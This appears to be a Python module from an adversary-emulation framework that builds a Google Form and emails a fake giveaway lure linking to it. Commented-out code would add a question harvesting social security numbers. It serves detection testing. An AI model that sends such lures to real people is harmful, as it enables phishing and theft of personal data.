import base64
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from googleapiclient.discovery import build

from swat.emulations.base_emulation import BaseEmulation


class Emulation(BaseEmulation):
    parser = BaseEmulation.load_parser(description='Sends a phishing email to a user with a HTML attachment.')
    parser.add_argument('session_key', default='default', help='Session to use for service building API service')
    parser.add_argument('--recipient', required=True, help='Recipient email address')
    parser.add_argument('--sender', required=True, help='Sender email address')

    name = 'Google Forms Phishing Emulation'
    techniques = ['T1566.001', 'T1204.002']
    scopes = ['forms.create', 'forms.delete', 'gmail.send']
    services = ['forms', 'gmail']

    def __init__(self, **kwargs) -> None:
        super().__init__(**kwargs)
        self.forms_service = build('forms', 'v1', credentials=self.obj.cred_store.store[self.args.session_key].session)
        self.gmail_service = build('gmail', 'v1', credentials=self.obj.cred_store.store[self.args.session_key].session)

    def create_google_form(self) -> str:
        """Create a Google Form with the given title, description, and questions."""
        form_info = {"info": {"title": self.econfig['form']['title']}}
        form = self.forms_service.forms().create(body=form_info).execute()
        self.forms_service.forms().batchUpdate(formId=form["formId"],
                                               body=self.econfig['form']['make_quiz']).execute()
        self.forms_service.forms().batchUpdate(formId=form["formId"],
                                               body=self.econfig['form']['add_description']).execute()
        #self.forms_service.forms().batchUpdate(formId=form["formId"],
                                               #body=self.econfig['form']['questions']['first_name']).execute()
        #self.forms_service.forms().batchUpdate(formId=form["formId"],
                                               #body=self.econfig['form']['questions']['last_name']).execute()
        #self.forms_service.forms().batchUpdate(formId=form["formId"],
                                               #body=self.econfig['form']['questions']['social_security_number']).execute()
        form_update = {"title": self.econfig['form']['title'],
                       "description": self.econfig['form']['description'],
                       "questions": self.econfig['form']['questions']}
        self.forms_service.forms().batchUpdate(formId=form["formId"],
                                                    body=form_update).execute()
        self.elogger.info(f'Created Google Form: {form["formId"]}')
        return form['formId']

    def create_email(self, form_id: str) -> dict:
        """Create the email."""
        url = f"https://docs.google.com/forms/d/{form_id}/viewform"
        message  = MIMEMultipart()
        message['from'] = self.args.sender
        message['to'] = self.args.recipient
        message['subject'] = 'Congratulations on Winning the Giveaway!'
        body = f'You have won our recent giveaway! Click the link to claim: {url}'
        message.attach(MIMEText(body, 'plain'))
        self.elogger.info(f'Created email with Google Form link')
        return {'raw': base64.urlsafe_b64encode(message.as_bytes()).decode()}

    def send_email(self, email: dict) -> None:
        """Send the email."""
        self.gmail_service.users().messages().send(userId='me', body=email).execute()
        self.elogger.info(f'Sent email to {self.args.recipient} from {self.args.sender}')

    def execute(self) -> None:
        """Execute the emulation."""
        form_id = self.create_google_form()
        email = self.create_email(form_id)
        self.send_email(email)